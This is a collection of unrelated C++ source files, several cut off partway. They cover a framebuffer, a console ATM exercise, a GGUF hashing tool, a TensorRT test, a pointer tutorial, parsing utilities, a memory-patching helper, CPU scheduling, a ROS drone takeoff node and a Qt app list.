    "#include \"moon.h\"\r\n\r\n\r\nvoid Buffer::SetBuffer(long width, long height) {\r\n\tif (width < 0 || height <= 0) {\r\n\t\tthrow std::runtime_error(\"FrameBuffer-Unexpected screen size!\");\r\n\t}\r\n\telse {\r\n\t\tBuffer_size[0] = width;\r\n\t\tBuffer_size[1] = height;\r\n\r\n\t\tRedBuffer.clear();\r\n\t\tGreenBuffer.clear();\r\n\t\tBlueBuffer.clear();\r\n\t\tDepthBuffer.clear();\r\n\r\n\t\tRedBuffer.resize(width * height);\r\n\t\tGreenBuffer.resize(width * height);\r\n\t\tBlueBuffer.resize(width * height);\r\n\t\tDepthBuffer.resize(width * height);\r\n\t\tDepthBuffer.assign(width * height, 1);\r\n\t}\r\n\treturn;\r\n};\r\n\r\nvoid Buffer::CleanBuffer() {\r\n\tlong totall = Buffer_size[0] * Buffer_size[1];\r\n\tRedBuffer.assign(totall, 0);\r\n\tGreenBuffer.assign(totall, 0);\r\n\tBlueBuffer.assign(totall, 0);\r\n\tDepthBuffer.assign(totall, 1);  //\u00b3\u00f5\u00ca\u00bcDepthBuffer\r\n};\r\n\r\n\r\nvoid Buffer::PutPixel(long x, long  y, double deepth, Color c) {\r\n\tif (x < 0 || x > Buffer_size[0] - 1 || y < 0 || y > Buffer_size[1] - 1) {\r\n\t\treturn;\r\n\t}\r\n\telse {\r\n\t\tlong totall = y * Buffer_size[0] + x;\r\n\t\tRedBuffer[totall] = c.R;\r\n\t\tGreenBuffer[totall] = c.G;\r\n\t\tBlueBuffer[totall] = c.B;\r\n\t\tDepthBuffer[totall] = deepth;\r\n\t}\r\n};\r\n\r\n\r\nColor Buffer::GetPixelColor(const long x, const long y) {\r\n\tif (x < 0 || x >= Buffer_size[0] || y < 0 || y >= Buffer_size[1]) {\r\n\t\treturn { 0,0,0 };\r\n\t}\r\n\telse {\r\n\t\tColor back;\r\n\t\tlong totall = y * Buffer_size[0] + x;\r\n\t\tback.R = RedBuffer[totall];\r\n\t\tback.G = GreenBuffer[totall];\r\n\t\tback.B = BlueBuffer[totall];\r\n\t\treturn back;\r\n\t}\r\n\r\n};\r\n\r\nbool Buffer::CompareDepth_Smaller(const long x, const long y, double depth_in) {\r\n\tif (x < 0 || x >= Buffer_size[0] || y < 0 || y >= Buffer_size[1]) {\r\n\t\tthrow std::runtime_error(\"FrameBuffer-Unexpected comparision!\");\r\n\t}\r\n\tif (DepthBuffer[y * Buffer_size[0] + x] > depth_in) {\r\n\t\treturn true;\r\n\t}\r\n\telse {\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\ndouble Buffer::GetDepth(const long x, const long y) {\r\n\tif (x < 0 || x >= Buffer_size[0] || y < 0 || y >= Buffer_size[1]) {\r\n\t\treturn 1;\r\n\t}\r\n\telse {\r\n\t\treturn DepthBuffer[y * Buffer_size[0] + x];\r\n\t}\r\n\r\n};\r\n\r\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <fstream> \r\n\r\nusing namespace std;\r\nvoid Login();\r\nvoid ShowMenueScreen();\r\nstring ClientFile = \"Clients.txt\";\r\nvoid ShowScreenQuickWhithDraw();\r\nstruct sClient\r\n{\r\n\tstring AccountNumber = \"\";\r\n\tstring PinCode = \"\";\r\n\tstring Name = \"\";\r\n\tstring Phone = \"\";\r\n\tdouble AccountBalance = 0;\r\n\tbool MarketForDelete = false;\r\n};\r\n\r\nenum eATMmenue\r\n{\r\n\tQuickWithDraw = 1, NormalWithDraw = 2,\r\n\tDeposite = 3, CheackBalance = 4,\r\n\tLogout = 5\r\n};\r\n\r\nenum eWithDraw\r\n{\r\n\tTwenty = 1, Fifty = 2,\r\n\tOneHundred = 3, TwoHundred = 4,\r\n\tFourHundred = 5, SixHundred = 6,\r\n\tEightHundred = 7, OneThousand = 8,\r\n\tExit = 9\r\n};\r\n\r\nsClient stClientATM;\r\n\r\nvector <string> SplingData(string Line , string Delim)\r\n{\r\n\tstring Sword;\r\n\tshort Pos;\r\n\tvector <string> LoadData;\r\n\twhile ((Pos = Line.find(Delim)) != std::string::npos)\r\n\t{\r\n\t\tSword = Line.substr(0, Pos);\r\n\t\tif (Sword != \"\")\r\n\t\t{\r\n\t\t\tLoadData.push_back(Sword);\r\n\t\t}\r\n\t\tLine.erase(0, Pos + Delim.length());\r\n\t}\r\n\tif (Line != \"\")\r\n\t{\r\n\t\tLoadData.push_back(Line);\r\n\t}\r\n\treturn LoadData;\r\n}\r\n\r\nsClient DataFileTosClient (string Line , string Delim = \"#//#\")\r\n{\r\n\tvector <string>DataToSpling = SplingData(Line , Delim);\r\n\tsClient Client;\r\n\r\n\tClient.AccountNumber = DataToSpling[0];\r\n\tClient.PinCode = DataToSpling[1];\r\n\tClient.Name = DataToSpling[2];\r\n\tClient.Phone = DataToSpling[3];\r\n\tClient.AccountBalance = stoi(DataToSpling[4]);\r\n\r\n\treturn Client;\r\n}\r\n\r\nvector <sClient> LoadDataFromFile (string FileName)\r\n{\r\n\tfstream Myfile;\r\n\tsClient Client;\r\n\tMyfile.open(FileName, ios::in);\r\n\r\n\tvector <sClient> LoadData;\r\n\tif (Myfile.is_open())\r\n\t{\r\n\t\tstring Line;\r\n\t\twhile (getline(Myfile, Line))\r\n\t\t{\r\n\t\t\tClient = DataFileTosClient(Line);\r\n\t\t\tLoadData.push_back(Client);\r\n\t\t}\r\n\t\tMyfile.close();\r\n\t}\r\n\treturn LoadData;\r\n}\r\n\r\nstring ReadUserNameAndPassword(string Massage)\r\n{\r\n\tstring PassAnUser;\r\n\tcout << Massage;\r\n\tgetline(cin >> ws, PassAnUser);\r\n\treturn PassAnUser;\r\n}\r\n\r\nshort GetNumber(string Massage)\r\n{\r\n\tshort Number;\r\n\tcout << Massage;\r\n\tcin >> Number;\r\n\treturn Number;\r\n}\r\n\r\nbool IsRightUserAndPassword (string UserName , string Password , sClient& DataUser)\r\n{\r\n\tvector <sClient>Data = LoadDataFromFile(ClientFile);\r\n\tfor (sClient& Temp : Data)\r\n\t{\r\n\t\tif (Temp.AccountNumber == UserName && Temp.PinCode == Password)\r\n\t\t{\r\n\t\t\tDataUser = Temp;\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\r\n\treturn false;\r\n}\r\n\r\nvoid ShowCheackBalance ()\r\n{\r\n\tcout << \"=====================================\\n\";\r\n\tcout << \"\\tCheack Balance Screen\\n\";\r\n\tcout << \"=====================================\\n\";\r\n\tcout << \"Your Balance is \" << stClientATM.AccountBalance << endl;\r\n}\r\n\r\nvoid GoBacktoMainMenue()\r\n{\r\n\tcout << \"\\nPress any Key to Go Back to Main Menue...\";\r\n\tsystem(\"pause>0\");\r\n\tShowMenueScreen();\r\n}\r\n\r\nbool TrueOrFalse (string Massage)\r\n{\r\n\tchar YesOrNo = 'n';\r\n\tcout << Massage;\r\n\tcin >> YesOrNo;\r\n\r\n\treturn YesOrNo == 'y';\r\n}\r\n\r\nstring DataToLoine (sClient Data , string Sepretor = \"#//#\")\r\n{\r\n\tstring Line;\r\n\tLine += Data.AccountNumber + Sepretor;\r\n\tLine += Data.PinCode + Sepretor;\r\n\tLine += Data.Name + Sepretor;\r\n\tLine += Data.Phone + Sepretor;\r\n\tLine += to_string(Data.AccountBalance);\r\n\treturn Line;\r\n}\r\n\r\nvoid SaveDataToFile (string FileName , sClient ClientToUpdatingBalance)\r\n{\r\n\tvector <sClient>LoadData = LoadDataFromFile(FileName);\r\n\tfstream Myfile;\r\n\tMyfile.open(FileName, ios::out);\r\n\tfor (sClient& s : LoadData)\r\n\t{\r\n\t\tif (s.AccountNumber == ClientToUpdatingBalance.AccountNumber)\r\n\t\t{\r\n\t\t\tMyfile << DataToLoine(ClientToUpdatingBalance) << endl;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tMyfile << DataToLoine(s) << endl;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid QuickWhithDraw (eWithDraw WithDraw)\r\n{\r\n\tint Balance = 0;\r\n\tif (WithDraw == eWithDraw::Exit)\r\n\t\tGoBacktoMainMenue();\r\n\t if (WithDraw == eWithDraw::Twenty)\r\n\t\tBalance = 20;\r\n\t if (WithDraw == eWithDraw::Fifty)\r\n\t\tBalance = 50;\r\n\t if (WithDraw == eWithDraw::OneHundred)\r\n\t\tBalance = 100;\r\n\t if (WithDraw == eWithDraw::TwoHundred)\r\n\t\tBalance = 200;\r\n\t if (WithDraw == eWithDraw::FourHundred)\r\n\t\tBalance = 400;\r\n\t if (WithDraw == eWithDraw::SixHundred)\r\n\t\tBalance = 600;\r\n\t if (WithDraw == eWithDraw::EightHundred)\r\n\t\tBalance = 800;\r\n\t if (WithDraw == eWithDraw::OneThousand)\r\n\t\tBalance = 1000;\r\n\r\n\t Balance = (stClientATM.AccountBalance - Balance);\r\n\r\n\tif (Balance > 0)\r\n\t{\r\n\t\tstClientATM.AccountBalance = Balance;\r\n\t\tif (TrueOrFalse(\"\\nAre You Sure You Want Perform this transaction? y/n? \"))\r\n\t\t{\r\n\t\t\tSaveDataToFile(ClientFile , stClientATM);\r\n\t\t\tcout << \"\\nDone Successfully. new balance is: \" << stClientATM.AccountBalance;\r\n\t\t\tGoBacktoMainMenue();\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tGoBacktoMainMenue();\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout << \"\\nThe Amount exceeds your balance, make another choice.\\n\";\r\n\t\tcout << \"Press AnyKey To Continue...\";\r\n\t\tsystem(\"pause>0\");\r\n\t\tShowScreenQuickWhithDraw();\r\n\t}\r\n}\r\n\r\nvoid ShowScreenQuickWhithDraw ()\r\n{\r\n\tsystem(\"cls\");\r\n\tcout << \"=======================================\\n\";\r\n\tcout << \"\\t     Quick WithDraw\\n\";\r\n\tcout << \"=======================================\\n\"",
    "#include \"ggml.h\"\n\n#include <cstdlib>   /* abort() */\n#include <cstddef>\n#include <cstdio>\n#include <string>\n#include <stdexcept>\n#include <algorithm>\n#include <cstring>\n\n#include <sstream>\n#include <fstream>\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n#include \"xxhash/xxhash.h\"\n#include \"sha1/sha1.h\"\n#include \"sha256/sha256.h\"\n\n#ifdef __cplusplus\n}\n#endif\n\n\n// uuid.uuid5(uuid.NAMESPACE_URL, 'en.wikipedia.org/wiki/Llama.cpp')\n#define UUID_NAMESPACE_LLAMA_CPP \"ef001206-dadc-5f6d-a15f-3359e577d4e5\"\n#define UUID_NAMESPACE_LLAMA_CPP_HEX 0xef, 0x00, 0x12, 0x06, 0xda, 0xdc, 0x5f, 0x6d, 0xa1, 0x5f, 0x33, 0x59, 0xe5, 0x77, 0xd4, 0xe5\n\n\n#define HASH_TYPE_SHA256_STR \"sha256\"\n#define HASH_TYPE_SHA1_STR   \"sha1\"\n#define HASH_TYPE_XXH64_STR  \"xxh64\"\n#define HASH_TYPE_UUID_STR   \"uuid\"\n\n\ntypedef enum {\n    HASH_EXIT_SUCCESS = 0, // All hash has been generated or validated\n    HASH_EXIT_FAILURE = 1, // Generic Failure\n    HASH_EXIT_MISMATCH = 2, // Hash mismatched during validation\n    HASH_EXIT_MANIFEST_MISSING_ENTRY = 3, // Hash attempted validation but missing entry in manifest\n    HASH_EXIT_MANIFEST_UNKNOWN_HASH = 4, // Manifest is present, but we do not know any hash format within it\n    HASH_EXIT_MANIFEST_FILE_ERROR = 5 // Manifest is either missing or not a known format\n} hash_exit_code_t;\n\n\ntypedef enum {\n    HASH_MANIFEST_NOT_FOUND,\n    HASH_MANIFEST_MISMATCH,\n    HASH_MANIFEST_OK,\n} hash_manifest_result_t;\n\n\nstruct hash_params {\n    std::string input;\n    bool xxh64 = false;\n    bool sha1 = false;\n    bool sha256 = false;\n    bool uuid = false;\n\n    bool no_layer = false;\n\n    bool manifest_is_usable = false;\n    std::string manifest_file;\n};\n\nstruct manifest_check_params {\n    bool xxh64 = false;\n    bool sha1 = false;\n    bool sha256 = false;\n    bool uuid = false;\n};\n\nstatic char const * hash_manifest_result_to_str(hash_manifest_result_t value) {\n    switch (value) {\n        case HASH_MANIFEST_NOT_FOUND: return \"Not Found\";\n        case HASH_MANIFEST_MISMATCH: return \"Mismatch\";\n        case HASH_MANIFEST_OK: return \"Ok\";\n    }\n    return \"?\";\n}\n\nstatic char const * hash_exit_code_to_str(hash_exit_code_t value) {\n    switch (value) {\n        case HASH_EXIT_SUCCESS: return \"Success\";\n        case HASH_EXIT_FAILURE: return \"Failure\";\n        case HASH_EXIT_MISMATCH: return \"Mismatch\";\n        case HASH_EXIT_MANIFEST_MISSING_ENTRY: return \"Manifest Missing Entry\";\n        case HASH_EXIT_MANIFEST_UNKNOWN_HASH: return \"Manifest Unknown Hash\";\n        case HASH_EXIT_MANIFEST_FILE_ERROR: return \"Manifest File Error\";\n    }\n    return \"?\";\n}\n\nstatic void hash_print_usage(const char * executable) {\n    const hash_params default_params;\n    printf(\"\\n\");\n    printf(\"usage: %s [options] GGUF_IN\\n\", executable);\n    printf(\"\\n\");\n    printf(\"Hash a GGUF file\");\n    printf(\"\\n\");\n    printf(\"options:\\n\");\n    printf(\"  -h, --help              show this help message and exit\\n\");\n    printf(\"      --xxh64             use xxh64 hash\\n\");\n    printf(\"      --sha1              use sha1 hash\\n\");\n    printf(\"      --sha256            use sha256 hash\\n\");\n    printf(\"      --all               use all hash\\n\");\n    printf(\"      --no-layer          exclude per layer hash\\n\");\n    printf(\"      --uuid              generate UUIDv5 ID\\n\");\n    printf(\"  -c, --check <manifest>  verify against a manifest\\n\");\n    printf(\"\\n\");\n}\n\nstatic void hash_params_parse_ex(int argc, const char ** argv, hash_params & params) {\n    std::string arg;\n    bool invalid_param = false;\n    const std::string arg_prefix = \"--\";\n\n    int arg_idx = 1;\n    for (; arg_idx < argc && strncmp(argv[arg_idx], \"--\", 2) == 0; arg_idx++) {\n        arg = argv[arg_idx];\n        if (arg.compare(0, arg_prefix.size(), arg_prefix) == 0) {\n            std::replace(arg.begin(), arg.end(), '_', '-');\n        }\n\n        bool arg_found = false;\n        if (arg == \"-h\" || arg == \"--help\") {\n            hash_print_usage(argv[0]);\n            exit(0);\n        }\n\n        if (arg == \"--xxh64\") {\n            arg_found = true;\n            params.xxh64 = true;\n        }\n\n        if (arg == \"--sha1\") {\n            arg_found = true;\n            params.sha1 = true;\n        }\n\n        if (arg == \"--uuid\") {\n            arg_found = true;\n            params.uuid = true;\n        }\n\n        if (arg == \"--sha256\") {\n            arg_found = true;\n            params.sha256 = true;\n        }\n\n        if (arg == \"--all\") {\n            arg_found = true;\n            params.sha256 = true;\n            params.sha1 = true;\n            params.xxh64 = true;\n        }\n\n        if (arg == \"--no-layer\") {\n            arg_found = true;\n            params.no_layer = true;\n        }\n\n        if (arg == \"-c\" || arg == \"--check\") {\n            if (++arg_idx >= argc) {\n                invalid_param = true;\n                break;\n            }\n            arg_found = true;\n            params.manifest_file = argv[arg_idx];\n        }\n\n        if (!arg_found) {\n            throw std::invalid_argument(\"error: unknown argu",
    "#include \"Segmenter.h\"\r\n// --------------------------- \u6d4b\u8bd5 main \u51fd\u6570 ---------------------------\r\nint main() {\r\n    try {\r\n        // 1. \u521b\u5efa Segmenter \u5bf9\u8c61\uff0c\u5e76\u81ea\u52a8\u5b8c\u6210\u914d\u7f6e\u8bfb\u53d6 & TensorRT \u521d\u59cb\u5316\r\n        Segmenter segmenter(\"../config.ini\");\r\n\r\n        // 2. \u6267\u884c\u63a8\u7406\r\n        // segmenter.doInference(2);\r\n\r\n        std::map<std::string, std::string> configMap = segmenter.loadConfig(\"../config.ini\");\r\n        bool saveProcessImage= (configMap[\"setting.saveProcessImage\"] == \"true\");\r\n        bool saveOutputImage = (configMap[\"setting.saveOutputImage\"] == \"true\");;\r\n        int loopCount = std::stoi(configMap[\"setting.loopCount\"]);\r\n\r\n        std::cout << \"[\u8bbe\u7f6e\u9879] \u4fdd\u5b58\u9884\u5904\u7406\u56fe\u50cf: \" << (saveProcessImage ? \"\u662f\" : \"\u5426\") << std::endl;\r\n        std::cout << \"[\u8bbe\u7f6e\u9879] \u4fdd\u5b58\u8f93\u51fa\u56fe\u50cf: \" << (saveOutputImage ? \"\u662f\" : \"\u5426\") << std::endl;\r\n        std::cout << \"[\u8bbe\u7f6e\u9879] \u5faa\u73af\u6b21\u6570: \" << loopCount << std::endl;\r\n\r\n        segmenter.doInferenceBatch(saveProcessImage,saveOutputImage,loopCount);\r\n\r\n        std::cout << \"[main] \u63a8\u7406\u5b8c\u6210\" << std::endl;\r\n    } \r\n    catch (const std::exception& e) {\r\n        std::cerr << \"[main] \u9519\u8bef: \" << e.what() << std::endl;\r\n        return -1;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"iostream\"\n\nusing namespace std;\n\nint main()\n{\n\t//TIPO DE DATOS\n\n\t// Bool tama\u00f1o [8bits] rango [0 (falso) y 1 (verdadero)]\n\t// Int tama\u00f1o [32bits]  rango [-2.147.483.648 y 2.147.483.647]\n\t/*combinaciones con los modificadores :\n\n\t\tshort int  [16bits] rango [-32.768 y 32.767]\n\t\tunsigned short int [16bits] rango [0 y 65535]\n\t\tunsigned int [32bits] rango [0 y 4.294.967.295.]\n\t\tlong long int [64bits] rango [-9.223.372.775.808 y 9.223.375.775.807]\n\t\tunsigned long long int [64bits] rango [0 y 2exp64]\n\t*/\n\t// float tama\u00f1o [32bits] decimales, usados para n\u00fameros con 6 o menos cifras decimales\n\t// double tama\u00f1o [64bits] decimales, usado para n\u00fameros menos de 15 cifras decimales\n\t// long double [96 bits] y con 18 cifras decimales.\n\t// char & string cadena de texto.\n\n\t//PUNTEROS\n\n\tint* var = new int; //creamos un entero\n\t*var = 100;\n\tcout << var; //imprimer la direcci\u00f3n de memoria\n\tcout << \"\\n\" << *var << \"\\n\"; //imprimimos el valor\n\n\tchar *var2 = new char;\n\t*var2 = 'K';\n\tcout << var2 << \"\\n\";\n\tcout << *var2;\n\n\n\t//Liberar memoria\n\tdelete var; //con esto liberamos la memoria\n\tdelete var2;\n\tvar = NULL;\n\tvar2 = NULL;\n\n\n\treturn 0;\n\n}\n",
    "\n\n\n#include \"UtilParsing.hpp\"\n\ntemplate <typename T, typename Y>\nbool\tUtilParsing::isKeyExist(const std::map<T, Y> & map, const T & key) {\n\treturn map.find(key) != map.end();\n}\n\ntemplate <typename T, typename Y>\nbool\tUtilParsing::isvalueExist(const std::map<T, std::set<Y> > & map, const T & key, const Y & )\n{\n\ttypename std::map<T, std::set<Y> >::const_iterator\tit = map.find(key);\n\tif (it == map.end())\n\t\treturn false;\n\treturn true; // HAVE TO CHECK THIS FUNCTION\n}\n\nbool    UtilParsing::isOnlySpace(const std::string & str)\n{\n    size_t  i;\n    size_t  size = str.size();\n\n    for (i = 0; i < size; i++) {\n        if (str[i] != ' ' && str[i] != '\\t' && str[i] != '\\n') {\n            return (i == size);\n        }\n    }\n    return (i == size);\n}\n\nstd::vector<std::string> UtilParsing::split(const std::string & line, const std::string & set)\n {\n    static std::vector<std::string> result;\n\n    for (size_t i = 0; i != std::string::npos;) {\n        size_t end = line.find_first_of(set, i);\n        result.push_back(line.substr(i, end - i));\n        if (result.back().empty() || UtilParsing::isOnlySpace(result.back()))\n            result.pop_back();\n        end != std::string::npos ? i = end + 1 : i = end;\n    }\n\n    return result;\n}\n\nstd::vector<std::string> UtilParsing::cleanVector(std::vector<std::string> vec)\n{\n    for (std::vector<std::string>::iterator it = vec.begin(); it != vec.end(); ) {\n        if (*it == \"{\" || *it == \"}\") \n        { \n            it = vec.erase(it);\n        } else \n            ++it;\n    }\n    return vec;\n}\n",
    "#include \"memory.hpp\"\n\nnamespace utils::memory\n{\n\tvoid jump(uintptr_t address, void* func)\n\t{\n\t\tauto target = reinterpret_cast<uint8_t*>(address);\n\t\tauto jmpValue = reinterpret_cast<uint32_t>(func) - (address + 5);\n\t\tDWORD oldProtectValue;\n\n\t\tVirtualProtect(target, 5, PAGE_EXECUTE_READWRITE, &oldProtectValue);\n\t\t*target = 0xE9;\n\t\t*reinterpret_cast<size_t*>(target + 1) = jmpValue;\n\t\tVirtualProtect(target, 5, oldProtectValue, &oldProtectValue);\n\t\tFlushInstructionCache(GetCurrentProcess(), target, 5);\n\t}\n\n\tvoid set_string(uintptr_t address, const char* str)\n\t{\n\t\tstrncpy(reinterpret_cast<char*>(address), str, strlen(str) + 1);\n\t}\n\n\tvoid nop(uintptr_t address, size_t length)\n\t{\n\t\tauto target = reinterpret_cast<uint8_t*>(address);\n\t\tDWORD oldProtectValue;\n\n\t\tVirtualProtect(target, length, PAGE_EXECUTE_READWRITE, &oldProtectValue);\n\t\tmemset(target, 0x90, length);\n\t\tVirtualProtect(target, length, oldProtectValue, &oldProtectValue);\n\t\tFlushInstructionCache(GetCurrentProcess(), target, length);\n\t}\n}",
    "#include <bits/stdc++.h>\n#include <iostream>\n#include <vector>\n#include <algorithm>\n#include <queue>\n#include <float.h>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\nstruct Task {\n    int task_id;\n    int arrival_time;\n    int burst_time;\n    int completion_time;\n    int turnaround_time;\n    int waiting_time;\n};\n\nvoid fcfs_schedule(vector<Task>& tasks, vector<pair<int, int>>& schedule) {\n    sort(tasks.begin(), tasks.end(), [](Task a, Task b) {\n        return a.arrival_time < b.arrival_time;\n    });\n\n    int current_time = 0;\n    for (auto& task : tasks) {\n        if (current_time < task.arrival_time) {\n            current_time = task.arrival_time;\n        }\n        schedule.push_back({current_time, task.task_id});\n        current_time += task.burst_time;\n        task.completion_time = current_time;\n        task.turnaround_time = task.completion_time - task.arrival_time;\n        task.waiting_time = task.turnaround_time - task.burst_time;\n    }\n}\n\nvoid sjf_schedule(vector<Task>& tasks, vector<pair<int, int>>& schedule) {\n    int n = tasks.size();\n    vector<int> rt(n);\n\n    for (int i = 0; i < n; i++)\n        rt[i] = tasks[i].burst_time;\n\n    int complete = 0, t = 0, minm = INT_MAX;\n    int shortest = 0, finish_time;\n    bool check = false;\n\n    while (complete != n) {\n        for (int j = 0; j < n; j++) {\n            if ((tasks[j].arrival_time <= t) && (rt[j] < minm) && rt[j] > 0) {\n                minm = rt[j];\n                shortest = j;\n                check = true;\n            }\n        }\n\n        if (!check) {\n            t++;\n            continue;\n        }\n\n        if (schedule.empty() || schedule.back().second != tasks[shortest].task_id) {\n            schedule.push_back({t, tasks[shortest].task_id});\n        }\n\n        rt[shortest]--;\n        minm = rt[shortest];\n        if (minm == 0)\n            minm = INT_MAX;\n\n        if (rt[shortest] == 0) {\n            complete++;\n            check = false;\n            finish_time = t + 1;\n            tasks[shortest].waiting_time = finish_time - tasks[shortest].burst_time - tasks[shortest].arrival_time;\n            if (tasks[shortest].waiting_time < 0)\n                tasks[shortest].waiting_time = 0;\n        }\n        t++;\n    }\n     // added\n    for (int i = 0; i < n; i++) {\n        tasks[i].turnaround_time = tasks[i].burst_time + tasks[i].waiting_time;\n    }\n}\n\nvoid rr_schedule(vector<Task>& tasks, vector<pair<int, int>>& schedule, int quantum) {\n    //sort task based on arrival time using comparator function\n    sort(tasks.begin(), tasks.end(), [](Task a, Task b) {\n        //comparator\n        return a.arrival_time < b.arrival_time;\n    });\n\n     //ready queue\n    queue<Task*> task_queue;\n    int current_time = 0;\n    size_t index = 0;\n\n    while (index < tasks.size() || !task_queue.empty()) {\n        // if aane wale task pahle hii aa chuka hai <= current_time\n        while (index < tasks.size() && tasks[index].arrival_time <= current_time) {\n            //push that task it in ready queue\n            task_queue.push(&tasks[index]);\n            ++index;\n        }\n         \n         // my ready queue intially don't have any task waiting for first task arrival\n        if (task_queue.empty()) {\n            // it occur at index = 0 or any time when next task come after a lot of time later\n            // until then all task executed and queue become empty\n            current_time = tasks[index].arrival_time;\n            continue;\n        }\n        \n        // select the first in first out task initial task\n        Task* current_task = task_queue.front();\n        // now pop that task for short time (if process don't execute complete we push it later)\n        task_queue.pop();\n        \n        // schedule task current run time\n        schedule.push_back({current_time, current_task->task_id});\n        \n        // if task completion (burst time) <= time qunqtun it execute complete\n        if (current_task->burst_time <= quantum) {\n            // update everythhinh of that task\n            // becuse task  get exevuted completely than we have info about completion time , turnaround time\n            // waiting time\n            current_time += current_task->burst_time;\n            current_task->completion_time = current_time;\n            current_task->turnaround_time = current_task->completion_time - current_task->arrival_time;\n            current_task->waiting_time = current_task->turnaround_time - current_task->burst_time;\n            current_task->burst_time = 0;\n        } else {\n            // suppose task don;t exceute complte \n            // decrease that task burst time \n            current_time += quantum;\n            current_task->burst_time -= quantum;\n            // push it in ready queue again\n            task_queue.push(current_task);\n        }\n         // all task that come after upper burst current time \n        while (index < tasks.size() && tasks[index].arrival_time <= current_time) {\n            task_queue.push(&tasks[index]);\n          ",
    "#include <ros/ros.h>\n#include <mavros_msgs/State.h>\n#include <mavros_msgs/CommandBool.h>\n#include <mavros_msgs/CommandTOL.h>\n#include <mavros_msgs/SetMode.h>\n\nros::ServiceClient arming_client;\nros::ServiceClient takeoff_client;\nros::ServiceClient set_mode_client;\n\nmavros_msgs::State current_state;\n\nvoid state_cb(const mavros_msgs::State::ConstPtr& msg)\n{\n    current_state = *msg;\n}\n\nbool set_mode(const std::string& mode)\n{\n    mavros_msgs::SetMode srv;\n    srv.request.custom_mode = mode;\n\n    if (set_mode_client.call(srv) && srv.response.mode_sent)\n    {\n        ROS_INFO(\"Mode set to %s\", mode.c_str());\n        return true;\n    }\n    else\n    {\n        ROS_ERROR(\"Failed to set mode %s\", mode.c_str());\n        return false;\n    }\n}\n\nbool takeoff(double altitude)\n{\n    mavros_msgs::CommandTOL srv;\n    srv.request.altitude = altitude;\n\n    if (takeoff_client.call(srv) && srv.response.success)\n    {\n        ROS_INFO(\"Takeoff successful to %.2f meters.\", altitude);\n        return true;\n    }\n    else\n    {\n        ROS_ERROR(\"Failed to call takeoff service.\");\n        return false;\n    }\n}\n\nint main(int argc, char** argv)\n{\n    ros::init(argc, argv, \"px4_takeoff_cpp_node\");\n    ros::NodeHandle nh;\n\n    // Initialize clients\n    arming_client = nh.serviceClient<mavros_msgs::CommandBool>(\"/mavros/cmd/arming\");\n    takeoff_client = nh.serviceClient<mavros_msgs::CommandTOL>(\"/mavros/cmd/takeoff\");\n    set_mode_client = nh.serviceClient<mavros_msgs::SetMode>(\"/mavros/set_mode\");\n\n    ros::Subscriber state_sub = nh.subscribe(\"mavros/state\", 10, state_cb);\n\n    // Wait for FCU connection\n    while (ros::ok() && !current_state.connected)\n    {\n        ROS_INFO(\"Waiting for FCU connection...\");\n        ros::spinOnce();\n        ros::Duration(0.5).sleep();\n    }\n\n    // Arm the vehicle\n    mavros_msgs::CommandBool arm_cmd;\n    arm_cmd.request.value = true;\n    if (arming_client.call(arm_cmd) && arm_cmd.response.success)\n    {\n        ROS_INFO(\"Vehicle armed.\");\n    }\n    else\n    {\n        ROS_ERROR(\"Failed to arm vehicle.\");\n        return -1;\n    }\n\n    // Set mode to GUIDED\n    if (!set_mode(\"GUIDED\"))\n    {\n        ROS_ERROR(\"Failed to set mode to GUIDED.\");\n        return -1;\n    }\n\n    // Wait for mode change\n    ros::Duration(2.0).sleep();\n\n    // Takeoff to 2 meters\n    if (!takeoff(2.0))\n    {\n        return -1;\n    }\n\n    // Wait for stability\n    ros::Duration(10.0).sleep();\n\n    // Switch to HOLD mode\n    if (!set_mode(\"HOLD\"))\n    {\n        ROS_ERROR(\"Failed to set mode to HOLD.\");\n        return -1;\n    }\n\n    ros::spin();\n    return 0;\n}\n",
    "#include \"getlist.h\"\n#include <QApplication>\n#include <QDesktopServices>\n#include <QStringList>\n#include <QDesktopWidget>\n#include <QSystemInfo>\n\nGetList::GetList(QObject *parent) :\n    QObject(parent)\n{\n}\n\nGetList::GetList(Language *__language, QObject *parent) :\n    QObject(parent)\n{\n    _language = __language;\n    n_manager = new QNetworkAccessManager(this);\n\n    appListVersion = QApplication::instance()->applicationVersion();\n\n    downloadProgress = 0;\n    connect(&downloader, SIGNAL(progressChanged(int)),\n            this, SLOT(progressChangedReceived(int)));\n    connect(&downloader, SIGNAL(downloadDone()),\n            this, SLOT(downloadDoneReceived()));\n    connect(&downloader, SIGNAL(downloadError(int)),\n            this, SLOT(downloadErrorReceived(int)));\n\n    os=\"\"; resolution=\"\";\n\n    downloadFromStoreStarted = false;\n    activateCount = 0;\n\n    QtMobility::QSystemInfo si;\n    os = si.version(QtMobility::QSystemInfo::Os);\n\n    QDesktopWidget* desktopWidget = QApplication::desktop();\n    int width = desktopWidget->screenGeometry().width();\n    qDebug() << width;\n    if (width == 480) resolution = \"1\"; //E6\n    else {\n        width = desktopWidget->screenGeometry().height();\n        if (width == 480) resolution = \"1\"; //E6 landscape\n        else resolution = \"0\";\n    }\n\n    updateManagement = new UpdateManagement(false);\n    connect(updateManagement, SIGNAL(loadingFinished(QStringList)),\n            this, SLOT(updateDataUpdated(QStringList)));\n    updateManagement->loadList();\n\n    QSettings settings(\"schumi1331\", \"AppList\");\n    updateIds = settings.value(\"apps/updateIds\", updateIds).toStringList();\n\n    useUnsigned = settings.value(\"apps/unsigned\", false).toBool();\n\n    struct ListEntry {\n        enum ListRoles {\n            IdRole = Qt::UserRole + 1,\n            NameRole = Qt::UserRole + 2,\n            UidRole = Qt::UserRole + 3,\n            UidStoreRole = Qt::UserRole + 4,\n            UidUnsignedRole = Qt::UserRole + 5,\n            IconRole = Qt::UserRole + 6,\n            VersionRole = Qt::UserRole + 7,\n            VersionStoreRole = Qt::UserRole + 8,\n            VersionUnsignedRole = Qt::UserRole + 9,\n            VersionDateRole = Qt::UserRole + 10,\n            VersionDateStoreRole = Qt::UserRole + 11,\n            VersionDateUnsignedRole = Qt::UserRole + 12,\n            InstalledUidRole = 